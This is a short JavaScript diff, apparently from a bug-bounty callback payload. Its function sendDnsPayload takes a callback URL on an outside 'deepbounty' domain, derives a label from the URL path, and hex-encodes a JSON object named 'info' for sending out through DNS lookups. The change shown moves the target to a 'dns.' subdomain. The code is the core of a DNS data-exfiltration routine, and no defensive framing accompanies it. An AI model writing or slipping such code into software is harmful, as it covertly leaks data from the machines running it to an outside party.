@@ -3,7 +3,7 @@ const CALLBACK_URL = 'https://deepbounty.domain.com/cb/123e4567-e89b-12d3-a456-4
 function sendDnsPayload() {
     try {
         const parsed = new URL(CALLBACK_URL);
-        const baseDomain = parsed.hostname;
+        const baseDomain = "dns." + parsed.hostname;
         const uuidLabel = (parsed.pathname.split('/').filter(Boolean).pop() || 'cb').replace(/[^a-zA-Z0-9]/g, '');
 
         const hexPayload = toHex(JSON.stringify(info));
